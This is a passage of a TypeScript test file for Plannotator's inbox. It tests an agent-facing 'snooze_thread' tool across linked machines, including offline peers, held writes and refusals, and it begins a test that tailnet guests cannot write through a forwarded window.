    dirs.push(dir);
    return dir;
  };
  const start = (dataDir: string) => startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: scriptedTailscale().run });
  const mcp = async (port: number) => {
    const client = new Client({ name: "inbox-machines-snooze", version: "1.0.0" });
    await client.connect(new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${port}/mcp`)));
    return client;
  };
  type Snoozed = { isError?: boolean; content: { text: string }[]; structuredContent?: Json };
  const call = async (client: Client, thread_id: string, until: string | null) => (await client.callTool({ name: "snooze_thread", arguments: { thread_id, until } })) as Snoozed;
  const inSoon = () => new Date(Date.now() + 86_400_000).toISOString();
  const list = async (port: number) => (await (await fetch(`http://127.0.0.1:${port}/api/inbox/threads?archived=exclude&snoozed=exclude&machines=1`)).json()) as Json;
  const snoozedIds = async (port: number) => ((await list(port)).snoozed as Json[]).map((row) => row.thread_id);
  const rowOn = async (port: number, id: string) => JSON.stringify(((await list(port)).sections as Json[]).flatMap((s) => s.threads)).includes(id);

  test("the agent on A snoozes B's thread: it lives on B, leaves A's list, and ends; B away, the call says it waits, and it applies when B is back", async () => {
    const dataA = scratch("plannotator-snooze-agent-a-");
    const dataB = scratch("plannotator-snooze-agent-b-");
    const a = await start(dataA);
    let b = await start(dataB);
    const clients: Client[] = [];
    try {
      const offered = (await (await fetch(`http://127.0.0.1:${b.port}/api/inbox/machines/offer`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })).json()) as Json;
      const linked = await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines/link`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ link: offered.link, address: `http://127.0.0.1:${b.port}`, back: `http://127.0.0.1:${a.port}` }) });
      expect(linked.status).toBe(201);
      const onB = await mcp(b.port);
      const onA = await mcp(a.port);
      clients.push(onA, onB);
      const project = scratch("plannotator-snooze-agent-project-");
      const sent = (await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body: "Plain news" } })) as { structuredContent: { thread_id: string } };
      const thread = sent.structuredContent.thread_id;
      await waitFor("B's thread on A", () => rowOn(a.port, thread));

      const snoozed = await call(onA, thread, inSoon());
      expect(snoozed.isError).toBeUndefined();
      expect(snoozed.structuredContent!.snoozed.until).toEqual(expect.any(String));
      expect(snoozed.content[0]!.text).toContain("is snoozed until");
      // On B's store, not on A's, and out of A's sections.
      expect(b.store.snoozes().map((s) => s.thread_id)).toEqual([thread]);
      expect(a.store.snoozes()).toEqual([]);
      await waitFor("the band on A", async () => (await snoozedIds(a.port)).includes(thread));
      expect(await rowOn(a.port, thread)).toBe(false);

      const ended = await call(onA, thread, null);
      expect(ended.content[0]!.text).toMatch(new RegExp(`^Thread ${thread} on .+: snooze ended\\.$`));
      expect(ended.structuredContent).toMatchObject({ snoozed: null, ended: ended.content[0]!.text });
      expect(b.store.snoozes()).toEqual([]);
      await waitFor("back in A's sections", () => rowOn(a.port, thread));
      await waitFor("the band on A is empty", async () => !(await snoozedIds(a.port)).includes(thread));
      // Nothing left to take off: not "ended".
      const none = await call(onA, thread, null);
      expect(none.content[0]!.text).toMatch(new RegExp(`^Thread ${thread} on .+ is not snoozed\\.$`));
      expect(none.structuredContent!.ended).toBeUndefined();

      // B asleep: the words the window uses, nothing lost, and it lands when B is back.
      await onB.close();
      clients.pop();
      b.stop();
      await waitFor("B offline on A", async () => ((await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json).machines.some((m: Json) => !m.self && m.state === "offline"), 30_000);
      // A time no snooze can take is refused now, with nothing held: never "this applies when it is back".
      const bad = await call(onA, thread, new Date(Date.now() - 60_000).toISOString());
      expect(bad.content[0]!.text).toStartWith("snooze_past: ");
      expect(await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/outbox`)).json()).toMatchObject({ waiting: [], notices: [] });
      const held = await call(onA, thread, inSoon());
      expect(held.isError).toBeUndefined();
      // Said in the structured result too: an MCP client may show the agent only that.
      expect(held.structuredContent!.held).toBe(held.content[0]!.text);
      expect(held.content[0]!.text).toMatch(/^Waiting for .+: this applies when .+ is back\.$/);
      b = await start(dataB);
      await waitFor("the held snooze on B", () => b.store.snoozes().some((s) => s.thread_id === thread), 45_000);
    } finally {
      for (const client of clients) await client.close().catch(() => {});
      a.stop();
      b.stop();
    }
  }, 120_000);

  /** A linked Inbox from before Snooze: its list says nothing of snoozes, its door has no such route. With `snoozes`, one that keeps them and answers `snooze`. */
  const olderDoor = (id: string, thread: string, seen: string[], snoozes = false, options: { row?: Json; snooze?: () => Response; door?: () => Response | null; streams?: ReadableStreamDefaultController[] } = {}) =>
    Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      idleTimeout: 0,
      fetch(req) {
        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
        seen.push(`${req.method} ${route}`);
        const refused = options.door?.();
        if (refused) return refused;
        if (route === "health") return Response.json({ ok: true, inbox_id: id, machine_links: 1, version: "0.28.45" });
        if (route === "events") return new Response(new ReadableStream({ start: (c) => { options.streams?.push(c); c.enqueue(new TextEncoder().encode(`event: hello\ndata: {"cursor":0}\n\n`)); } }), { headers: { "Content-Type": "text/event-stream" } });
        if (route === "threads") return Response.json({ cursor: 0, sections: [{ id: "new", threads: [{ thread_id: thread, project: { id: "prj_x" }, resolved_at: null, ...options.row }] }], projects: [], ...(snoozes ? { snoozes: true } : {}) });
        if (options.snooze && route.endsWith("/snooze")) return options.snooze();
        return Response.json({ code: "device_route_not_found", error: "Not a phone route." }, { status: 404 });
      },
    });
  const linkTo = (dataDir: string, peers: { id: string; port: number }[]) => {
    mkdirSync(join(dataDir, "inbox"), { recursive: true });
    const links = peers.map(({ id, port }, i) => ({ id, name: `Mini ${i + 1}`, token: `tok_${i}`, transport: { kind: "tailnet", url: `http://127.0.0.1:${port}` }, device_id: null, linked_at: "2026-10-30T00:00:00Z" }));
    writeFileSync(join(dataDir, "inbox", "machines.json"), JSON.stringify({ v: 1, self: { id: "ibx_01K00000000000000000000009" }, links }), { mode: 0o600 });
  };

  test("an older peer: refused in plain words before anything is sent, no notice left, and the viewer keeps working", async () => {
    const OLD = "ibx_01K00000000000000000000001";
    const thread = "msg_01K00000000000000000000001";
    const seen: string[] = [];
    const door = olderDoor(OLD, thread, seen);
    const dataDir = scratch("plannotator-snooze-agent-older-");
    linkTo(dataDir, [{ id: OLD, port: door.port as number }]);
    const inbox = await start(dataDir);
    const client = await mcp(inbox.port);
    try {
      const view = async () => ((await (await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === OLD);
      await waitFor("the older machine's list", async () => (await view()).list_cursor !== null);
      expect((await view()).snoozes).toBe(false);
      const refused = await call(client, thread, inSoon());
      expect(refused.isError).toBe(true);
      expect(refused.content[0]!.text).toBe("machine_needs_update: Update Plannotator on Mini 1: it cannot snooze threads yet. Nothing changed.");
      expect(seen.some((line) => line.includes("snooze"))).toBe(false);
      const outbox = (await (await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/outbox`)).json()) as Json;
      expect(outbox).toMatchObject({ waiting: [], notices: [] });
      expect((await view()).state).toBe("online");
    } finally {
      await client.close().catch(() => {});
      inbox.stop();
      door.stop(true);
    }
  });

  /** A viewer linked to one stand-in door whose list has been read. */
  const withDoor = async (prefix: string, thread: string, snoozes: boolean, options: Parameters<typeof olderDoor>[4], run: (inbox: { port: number }, client: Client, seen: string[]) => Promise<void>) => {
    const id = "ibx_01K00000000000000000000004";
    const seen: string[] = [];
    const door = olderDoor(id, thread, seen, snoozes, options);
    const dataDir = scratch(prefix);
    linkTo(dataDir, [{ id, port: door.port as number }]);
    const inbox = await start(dataDir);
    const client = await mcp(inbox.port);
    try {
      await waitFor("that machine's list", async () => ((await (await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/machines`)).json()) as Json).machines.some((m: Json) => m.id === id && m.list_cursor !== null));
      await run(inbox, client, seen);
    } finally {
      await client.close().catch(() => {});
      inbox.stop();
      door.stop(true);
    }
  };
  const outboxOf = async (port: number) => (await (await fetch(`http://127.0.0.1:${port}/api/inbox/outbox`)).json()) as Json;

  test("an agent's mistake never leaves the machine or the person a word: a bad, past or too-far time and an archived row are refused here", async () => {
    await withDoor("plannotator-snooze-agent-mistake-", "msg_01K00000000000000000000005", true, { row: { resolved_at: "2026-11-01T00:00:00Z" } }, async (inbox, client, seen) => {
      const thread = "msg_01K00000000000000000000005";
      const year = new Date().getUTCFullYear();
      expect((await call(client, thread, new Date(Date.now() - 60_000).toISOString())).content[0]!.text).toStartWith("snooze_past: ");
      expect((await call(client, thread, `${year + 5}-01-01T00:00:00Z`)).content[0]!.text).toStartWith("validation_error: until: a time within");
      expect((await call(client, thread, "Nov 12")).content[0]!.text).toStartWith("validation_error: until: an ISO 8601 time");
      expect((await call(client, thread, inSoon())).content[0]!.text).toStartWith("thread_resolved: ");
      expect(seen.some((line) => line.endsWith("/snooze"))).toBe(false);
      expect(await outboxOf(inbox.port)).toMatchObject({ waiting: [], notices: [] });
    });
  });

  test("a machine's own refusal comes back as its code, and only a snooze that went through marks the person as having used Snooze", async () => {
    const was = process.env.PLANNOTATOR_DATA_DIR;
    const configDir = scratch("plannotator-snooze-agent-config-");
    process.env.PLANNOTATOR_DATA_DIR = configDir;
    const mark = () => (existsSync(join(configDir, "config.json")) ? JSON.parse(readFileSync(join(configDir, "config.json"), "utf8")).inboxSnoozeIntro?.snoozedAt : undefined);
    try {
      let answer = () => Response.json({ error: "A newer Plannotator wrote these.", code: "snoozes_newer" }, { status: 409 });
      await withDoor("plannotator-snooze-agent-refused-", "msg_01K00000000000000000000006", true, { snooze: () => answer() }, async (_inbox, client) => {
        const thread = "msg_01K00000000000000000000006";
        const refused = await call(client, thread, inSoon());
        expect(refused.isError).toBe(true);
        expect(refused.content[0]!.text).toBe("snoozes_newer: A newer Plannotator wrote these.");
        expect(mark()).toBeUndefined();
        answer = () => Response.json({ snoozed: null });
        expect((await call(client, thread, null)).structuredContent!.snoozed).toBeNull();
        expect(mark()).toBeUndefined();
        const at = new Date().toISOString();
        answer = () => Response.json({ snoozed: { until: inSoon(), at } });
        expect((await call(client, thread, inSoon())).structuredContent!.snoozed.at).toBe(at);
        expect(mark()).toEqual(expect.any(String));
      });
    } finally {
      if (was === undefined) delete process.env.PLANNOTATOR_DATA_DIR;
      else process.env.PLANNOTATOR_DATA_DIR = was;
    }
  });

  test("the link is removed as the snooze arrives: the agent hears it was not delivered, not that it is waiting", async () => {
    await withDoor("plannotator-snooze-agent-revoked-", "msg_01K00000000000000000000007", true, { snooze: () => Response.json({ code: "device_revoked", error: "Link removed." }, { status: 401 }) }, async (_inbox, client) => {
      const refused = await call(client, "msg_01K00000000000000000000007", inSoon());
      expect(refused.isError).toBe(true);
      expect(refused.content[0]!.text).toStartWith("not_delivered: ");
    });
  });

  test("a link the other machine removed is no success: the thread is simply gone from here, and nothing waits for it", async () => {
    let gone = false;
    const revoked = () => Response.json({ code: "device_revoked", error: "Link removed." }, { status: 401 });
    const streams: ReadableStreamDefaultController[] = [];
    await withDoor("plannotator-snooze-agent-link-gone-", "msg_01K0000000000000000000000E", true, { door: () => (gone ? revoked() : null), streams }, async (inbox, client) => {
      gone = true;
      for (const stream of streams) stream.close();
      await waitFor("the link is gone", async () => ((await (await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/machines`)).json()) as Json).machines.every((m: Json) => m.id !== "ibx_01K00000000000000000000004"), 30_000);
      const refused = await call(client, "msg_01K0000000000000000000000E", inSoon());
      expect(refused.content[0]!.text).toBe("thread_not_found: No thread msg_01K0000000000000000000000E.");
      expect((await outboxOf(inbox.port)).waiting).toEqual([]);
    });
  }, 45_000);

  test("what the listed row says decides: a thread that came back from its archive snoozes, and ending a snooze is never refused as archived", async () => {
    const seen: string[] = [];
    await withDoor("plannotator-snooze-agent-came-back-", "msg_01K00000000000000000000008", true, { row: { resolved_at: "2026-11-01T00:00:00Z", back_from_archive: true }, snooze: () => { seen.push("snooze"); return Response.json({ snoozed: { until: inSoon(), at: new Date().toISOString() } }); } }, async (_inbox, client) => {
      expect((await call(client, "msg_01K00000000000000000000008", inSoon())).isError).toBeUndefined();
    });
    expect(seen).toEqual(["snooze"]);
    await withDoor("plannotator-snooze-agent-archived-end-", "msg_01K00000000000000000000009", true, { row: { resolved_at: "2026-11-01T00:00:00Z" }, snooze: () => { seen.push("end"); return Response.json({ snoozed: null }); } }, async (_inbox, client) => {
      expect((await call(client, "msg_01K00000000000000000000009", null)).isError).toBeUndefined();
    });
    expect(seen).toEqual(["snooze", "end"]);
  });

  test("only an explicit null says ended: a time that did not apply on a machine whose clock is ahead stays not snoozed, though a snooze was running", async () => {
    const thread = "msg_01K0000000000000000000000F";
    const running = { until: new Date(Date.now() + 30 * 86_400_000).toISOString(), at: new Date().toISOString() };
    await withDoor("plannotator-snooze-agent-clock-ahead-", thread, true, { row: { snoozed: running }, snooze: () => Response.json({ snoozed: null }) }, async (_inbox, client) => {
      const missed = await call(client, thread, inSoon());
      expect(missed.content[0]!.text).toMatch(new RegExp(`^Thread ${thread} on .+ is not snoozed\\.$`));
      expect(missed.structuredContent!.ended).toBeUndefined();
      const ended = await call(client, thread, null);
      expect(ended.content[0]!.text).toMatch(new RegExp(`^Thread ${thread} on .+: snooze ended\\.$`));
    });
  });

  test("a machine still answering past its wait is on its way: said as held, not as refused", async () => {
    let answered = () => {};
    const slow = new Promise<Response>((resolve) => { answered = () => resolve(Response.json({ snoozed: null })); });
    await withDoor("plannotator-snooze-agent-slow-", "msg_01K0000000000000000000000A", true, { snooze: () => slow as unknown as Response }, async (_inbox, client) => {
      const answer = await call(client, "msg_01K0000000000000000000000A", inSoon());
      answered();
      expect(answer.isError).toBeUndefined();
      expect(answer.structuredContent!.held).toBe(answer.content[0]!.text);
      expect(answer.content[0]!.text).toStartWith("Sending to ");
    });
  }, 20_000);

  test("an id that is no message id is not found, never maybe on a machine nothing is known of", async () => {
    const dataDir = scratch("plannotator-snooze-agent-garbage-");
    linkTo(dataDir, [{ id: "ibx_01K0000000000000000000000B", port: 9 }]);
    const inbox = await start(dataDir);
    const client = await mcp(inbox.port);
    try {
      expect((await call(client, "not-an-id", inSoon())).content[0]!.text).toBe("thread_not_found: No thread not-an-id.");
      expect((await call(client, "", inSoon())).content[0]!.text).toBe("validation_error: thread_id: required.");
      expect((await call(client, "msg_01K0000000000000000000000C", inSoon())).content[0]!.text).toStartWith("machine_offline: ");
    } finally {
      await client.close().catch(() => {});
      inbox.stop();
    }
  });

  test("a home machine that still refuses a lapsed time leaves its notice: the person hears, since it may still be hiding the thread", async () => {
    await withDoor("plannotator-snooze-agent-older-home-", "msg_01K0000000000000000000000D", true, { snooze: () => Response.json({ error: "That time has passed.", code: "snooze_past" }, { status: 409 }) }, async (inbox, client) => {
      expect((await call(client, "msg_01K0000000000000000000000D", inSoon())).content[0]!.text).toBe("snooze_past: That time has passed.");
      expect((await outboxOf(inbox.port)).notices).toHaveLength(1);
    });
  });

  test("the person moved a snooze earlier while its machine was away, and that time passed: it comes back, marked, not hidden for the old time", async () => {
    const dataA = scratch("plannotator-snooze-lapse-a-");
    const dataB = scratch("plannotator-snooze-lapse-b-");
    const a = await start(dataA);
    let b = await start(dataB);
    const closing: Client[] = [];
    try {
      const offered = (await (await fetch(`http://127.0.0.1:${b.port}/api/inbox/machines/offer`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })).json()) as Json;
      expect((await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines/link`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ link: offered.link, address: `http://127.0.0.1:${b.port}`, back: `http://127.0.0.1:${a.port}` }) })).status).toBe(201);
      const onB = await mcp(b.port);
      const project = scratch("plannotator-snooze-lapse-project-");
      const asked = async (session: string) => ((await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: session, body: "Plain news" } })) as { structuredContent: { thread_id: string } }).structuredContent.thread_id;
      const moved = await asked("ses_moved");
      const undone = await asked("ses_undone");
      const agents = await asked("ses_agents");
      const quiet = await asked("ses_quiet");
      await onB.close();
      for (const thread of [moved, undone, agents, quiet]) await waitFor("B's thread on A", () => rowOn(a.port, thread));
      const peer = ((await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => !m.self).id as string;
      const onA = await mcp(a.port);
      closing.push(onA);
      let key = 0;
      const person = (thread: string, until: string, at?: string, idempotency_key = `person-${key++}`) => fetch(`http://127.0.0.1:${a.port}/api/inbox/m/${peer}/threads/${thread}/snooze`, { method: "POST", headers: { "Content-Type": "application/json", "X-Plannotator-Thread": thread }, body: JSON.stringify({ idempotency_key, until, at }) });
      const inMonth = (days = 30) => new Date(Date.now() + days * 86_400_000).toISOString();
      const firstAt: Record<string, string> = {};
      for (const thread of [moved, undone, agents]) {
        const placed = await person(thread, inMonth());
        expect(placed.status).toBe(200);
        firstAt[thread] = ((await placed.json()) as Json).snoozed.at;
      }
      // Already gone when asked: refused now, nothing held, as it always was.
      expect((await person(moved, new Date(Date.now() - 60_000).toISOString())).status).toBe(409);
      expect((await outboxOf(a.port)).waiting).toEqual([]);

      b.stop();
      await waitFor("B offline on A", async () => ((await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json).machines.some((m: Json) => !m.self && m.state === "offline"), 30_000);
      // Room for every write below to land before this time, on a slow machine too; the test waits for the time itself.
      const soon = new Date(Date.now() + 10_000).toISOString();
      expect((await person(moved, soon, undefined, "person-moved")).status).toBe(202);
      expect((await person(undone, inMonth(40))).status).toBe(202);
      expect((await person(undone, soon, firstAt[undone])).status).toBe(202);
      expect((await call(onA, agents, soon)).structuredContent!.held).toEqual(expect.stringMatching(/^Waiting for /));
      expect((await person(quiet, soon)).status).toBe(202);
      await Bun.sleep(Date.parse(soon) - Date.now() + 100);

      // The window retries a write it holds, past that time too: still the held one, never refused here.
      const retry = await person(moved, soon, undefined, "person-moved");
      expect(retry.status).toBe(202);
      expect(retry.headers.get("Idempotent-Replayed")).toBe("true");

      b = await start(dataB);
      await waitFor("the held writes settled", async () => (await outboxOf(a.port)).waiting.length === 0, 45_000);
      expect((await outboxOf(a.port)).notices).toEqual([]);
      const home = b.store.snoozes();
      for (const thread of [moved, undone, agents]) expect(home.find((s) => s.thread_id === thread)!.until).toBe(new Date(soon).toISOString());
      expect(home.some((s) => s.thread_id === quiet)).toBe(false);
      expect([...b.store.snoozedThreads()]).toEqual([]);
      // Marked as back, as a return on time is.
      const rows = ((await (await fetch(`http://127.0.0.1:${b.port}/api/inbox/threads?snoozed=exclude`)).json()) as Json).sections.flatMap((section: Json) => section.threads) as Json[];
      for (const thread of [moved, undone, agents]) expect(rows.find((row) => row.thread_id === thread)?.snooze_back).toBe(new Date(soon).toISOString());
      expect(rows.find((row) => row.thread_id === quiet)?.snooze_back ?? null).toBeNull();
    } finally {
      for (const client of closing) await client.close().catch(() => {});
      a.stop();
      b.stop();
    }
  }, 120_000);

  test("a held write says what the window's does, by the machine's state", () => {
    for (const state of ["online", "connecting", "offline", "needs_update"] as const) {
      expect([state, machineHeldWords("Mini", state)]).toEqual([state, heldWords({ name: "Mini", state })]);
    }
  });

  test("this Inbox restarted with the home machine away: the agent hears the thread may be there, not that it does not exist; a time that lapses while it is away settles with no notice", async () => {
    const dataA = scratch("plannotator-snooze-agent-restart-a-");
    const dataB = scratch("plannotator-snooze-agent-restart-b-");
    let a = await start(dataA);
    let b = await start(dataB);
    const clients: Client[] = [];
    try {
      const offered = (await (await fetch(`http://127.0.0.1:${b.port}/api/inbox/machines/offer`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })).json()) as Json;
      expect((await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines/link`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ link: offered.link, address: `http://127.0.0.1:${b.port}`, back: `http://127.0.0.1:${a.port}` }) })).status).toBe(201);
      const onB = await mcp(b.port);
      const project = scratch("plannotator-snooze-agent-restart-project-");
      const asked = (await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body: "Plain news" } })) as { structuredContent: { thread_id: string } };
      const reply = (await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body: "More news" } })) as { structuredContent: { thread_id: string; message_id: string } };
      const thread = asked.structuredContent.thread_id;
      expect(reply.structuredContent.thread_id).toBe(thread);
      await onB.close();
      await waitFor("B's thread on A", () => rowOn(a.port, thread));
      const name = ((await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => !m.self).name as string;
      const onA = await mcp(a.port);
      clients.push(onA);

      // A message that is not the thread's own id, on another machine: the refusal says which id it needs.
      expect((await call(onA, reply.structuredContent.message_id, inSoon())).content[0]!.text).toContain("use the thread's id, not a message's");

      // Away, a time that runs out before it is back: the person's own snooze and the agent's both end quietly.
      b.stop();
      await waitFor("B offline on A", async () => ((await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json).machines.some((m: Json) => !m.self && m.state === "offline"), 30_000);
      const soon = () => new Date(Date.now() + 5_000).toISOString();
      const last = Date.now() + 5_000;
      const peer = ((await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => !m.self).id as string;
      expect((await call(onA, thread, soon())).structuredContent!.held).toEqual(expect.stringMatching(/^Waiting for /));
      const own = await fetch(`http://127.0.0.1:${a.port}/api/inbox/m/${peer}/threads/${thread}/snooze`, { method: "POST", headers: { "Content-Type": "application/json", "X-Plannotator-Thread": thread }, body: JSON.stringify({ idempotency_key: "own-held", until: soon() }) });
      expect(own.status).toBe(202);
      expect((await outboxOf(a.port)).waiting).toHaveLength(2);
      await Bun.sleep(Math.max(0, last - Date.now()) + 5_000);

      // This Inbox restarts with B still away: B's rows are not known. Not "no such thread".
      await onA.close();
      clients.pop();
      a.stop();
      a = await start(dataA);
      const onA2 = await mcp(a.port);
      clients.push(onA2);
      const unknown = await call(onA2, thread, inSoon());
      expect(unknown.isError).toBe(true);
      expect(unknown.content[0]!.text).toBe(`machine_offline: This thread may be on ${name}, whose threads are not known yet (away or still connecting). Nothing changed.`);

      // B is back: both held snoozes reach it past their time, are not applied, and leave no notice. The thread is found again.
      b = await start(dataB);
      await waitFor("the held snoozes settled", async () => (await outboxOf(a.port)).waiting.length === 0, 45_000);
      expect((await outboxOf(a.port)).notices).toEqual([]);
      expect(b.store.snoozes()).toEqual([]);
      await waitFor("B's thread on A again", () => rowOn(a.port, thread));
      expect((await call(onA2, thread, inSoon())).isError).toBeUndefined();
    } finally {
      for (const client of clients) await client.close().catch(() => {});
      a.stop();
      b.stop();
    }
  }, 120_000);

  test("a thread two linked machines claim goes to neither, and an id no machine lists is not found", async () => {
    const thread = "msg_01K00000000000000000000002";
    const seen: string[] = [];
    const first = olderDoor("ibx_01K00000000000000000000002", thread, seen, true);
    const second = olderDoor("ibx_01K00000000000000000000003", thread, seen, true);
    const dataDir = scratch("plannotator-snooze-agent-clash-");
    linkTo(dataDir, [{ id: "ibx_01K00000000000000000000002", port: first.port as number }, { id: "ibx_01K00000000000000000000003", port: second.port as number }]);
    const inbox = await start(dataDir);
    const client = await mcp(inbox.port);
    try {
      await waitFor("both machines' lists", async () => ((await (await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/machines`)).json()) as Json).machines.filter((m: Json) => !m.self && m.snoozes === true).length === 2);
      const clash = await call(client, thread, inSoon());
      expect(clash.content[0]!.text).toStartWith("machine_conflict: ");
      const none = await call(client, "msg_01K00000000000000000000099", inSoon());
      expect(none.content[0]!.text).toStartWith("thread_not_found: ");
      expect(none.content[0]!.text).toContain("use the thread's id, not a message's");
      expect(seen.some((line) => line.includes("snooze"))).toBe(false);
    } finally {
      await client.close().catch(() => {});
      inbox.stop();
      first.stop(true);
      second.stop(true);
    }
  });
});

describe("the forward takes no write from a tailnet guest", () => {
  const MAGIC = "laptop.tail0000.ts.net";
  const OWNER = "owner@example.com";
  const GUEST = "guest@example.com";
  const roots: string[] = [];
  const restore: (() => void)[] = [];
  afterAll(() => {
    for (const undo of restore.splice(0)) undo();
    for (const root of roots) rmSync(root, { recursive: true, force: true });
  });
  const tomorrow = () => new Date(Date.now() + 24 * 60 * 60_000).toISOString();

  /** Tailscale as a script: who owns this machine (`status --json`; a tagged device has no owner), and serve on, off and status. */
  function ownedTailscale(tagged = false) {
    const serve = new Map<number, string>();
    const run: TailscaleRunner = (args) => {
      const ok = (stdout = "") => ({ status: 0, stdout, stderr: "" });
      if (args[0] === "status") {
        return ok(
          JSON.stringify({
            Self: { DNSName: `${MAGIC}.`, UserID: 42, ...(tagged ? { Tags: ["tag:server"] } : {}) },
            User: { "42": { ID: 42, LoginName: tagged ? "tagged-devices" : OWNER, DisplayName: "Owner" } },
          }),
        );
      }
      if (args[1] === "status") {
        if (serve.size === 0) return ok("{}");
        const TCP = Object.fromEntries([...serve.keys()].map((p) => [String(p), { HTTPS: true }]));
        const Web = Object.fromEntries([...serve].map(([p, proxy]) => [`${MAGIC}:${p}`, { Handlers: { "/": { Proxy: proxy } } }]));
        return ok(JSON.stringify({ TCP, Web }));
      }
      const httpsPort = Number(/--https=(\d+)/.exec(args.join(" "))![1]);
      if (args.includes("off")) {
        serve.delete(httpsPort);
        return ok();
      }
      serve.set(httpsPort, args.at(-1)!);
      return ok(`Available within your tailnet:\n\nhttps://${MAGIC}:${httpsPort}/\n|-- proxy ${args.at(-1)}\n`);
    };
    return { serve, run };
  }

  /**
   * A (the MacBook, `tagged`: a tagged Tailscale device with no owner) linked both ways to B (the Mini) on loopback,
   * A's window published on the tailnet with GUEST in `inboxTailscaleAllow`, and an agent's question waiting on B.
   */
  async function linkedPair(prefix: string, tagged: boolean, far: Partial<Parameters<typeof startInboxServer>[0]> = {}) {
    const root = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
    roots.push(root);
    const dataA = join(root, "macbook");
    const dataB = join(root, "mini");
    // config.json (read from PLANNOTATOR_DATA_DIR) lets GUEST onto A's window over the tailnet.
    mkdirSync(dataA, { recursive: true });
    writeFileSync(join(dataA, "config.json"), JSON.stringify({ inboxTailscaleAllow: [GUEST] }));
    const previous = process.env.PLANNOTATOR_DATA_DIR;
    process.env.PLANNOTATOR_DATA_DIR = dataA;
    restore.push(() => {
      if (previous === undefined) delete process.env.PLANNOTATOR_DATA_DIR;
      else process.env.PLANNOTATOR_DATA_DIR = previous;
    });
    const tsB = ownedTailscale();
    const a = await startInboxServer({ dataDir: dataA, binaryPath: null, phones: false, tailscale: ownedTailscale(tagged).run });
    const b = await startInboxServer({ dataDir: dataB, binaryPath: null, phones: false, tailscale: tsB.run, ...far });
    const client = new Client({ name: "inbox-forward-owner", version: "1.0.0" });
    const stop = async () => {
      await client.close().catch(() => {});
      a.stop();
      b.stop();
    };
    try {
      const sessionOf = async (port: number) => ((await (await fetch(`http://127.0.0.1:${port}/api/inbox/health`)).json()) as Json).serverSession as string;
      const post = async (port: number, path: string, body: Json) =>
        fetch(`http://127.0.0.1:${port}${path}`, { method: "POST", body: JSON.stringify({ serverSession: await sessionOf(port), ...body }) });
      // B publishes its door and offers; A links to it both ways.
      const offered = (await (await post(b.port, "/api/inbox/machines/offer", { tailscale: true })).json()) as Json;
      const linked = await post(a.port, "/api/inbox/machines/link", { link: offered.link, address: tsB.serve.get(8443)!, back: `http://127.0.0.1:${a.port}` });
      expect(linked.status).toBe(201);
      const mini = offered.machine.id as string;
      // An agent on B asks a question.
      await client.connect(new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${b.port}/mcp`)));
      const asked = (
        (await client.callTool({
          name: "send_message",
          arguments: { project_path: root, agent_session: "ses_forward_owner", agent_name: "Claude Code", agent_host: "claude-code", body: QUESTION(1) },
        })) as { structuredContent: { thread_id: string; message_id: string } }
      ).structuredContent;
      await waitFor("B's thread in A's merged list", async () => {
        const model = (await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/threads?machines=1`)).json()) as Json;
        return (model.sections as Json[]).flatMap((s) => s.threads as Json[]).some((r) => r.thread_id === asked.thread_id && r.machine === mini);
      });
      // A's window over the tailnet.
      expect((await post(a.port, "/api/inbox/settings", { tailscale: { on: true } })).status).toBe(200);
      const listener = a.tailscale.listenerPort();
      expect(listener).not.toBeNull();
      expect(a.tailscale.state().owner).toBe(tagged ? null : OWNER);
      const page = `https://${MAGIC}:${a.port}`;
      const tailnetHeaders = (login: string, type: string) => ({ Host: `${MAGIC}:${a.port}`, "Tailscale-User-Login": login, "Content-Type": type, Origin: page, "Sec-Fetch-Site": "same-origin" });
      /** A read or a JSON write through serve, as that login's browser sends it. */
      const throughServe = async (login: string, path: string, body?: Json, extra: Record<string, string> = {}) =>
        fetch(`http://127.0.0.1:${listener}${path}`, {
          method: body ? "POST" : "GET",
          headers: { ...(body ? tailnetHeaders(login, "application/json") : { Host: `${MAGIC}:${a.port}`, "Tailscale-User-Login": login }), ...extra },
          ...(body ? { body: JSON.stringify({ serverSession: await sessionOf(a.port), ...body }) } : {}),
        });
      /** A file through serve to B (an upload is never held). */
      const uploadThroughServe = async (login: string, key: string) =>
        fetch(`http://127.0.0.1:${listener}/api/inbox/m/${mini}/uploads?name=${key}.txt&idempotency_key=${key}&serverSession=${await sessionOf(a.port)}`, {
          method: "POST",
          headers: tailnetHeaders(login, "text/plain"),
          body: `from ${login}`,
        });
      const thread = async () => (await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/m/${mini}/threads/${asked.thread_id}`)).json()) as Json;
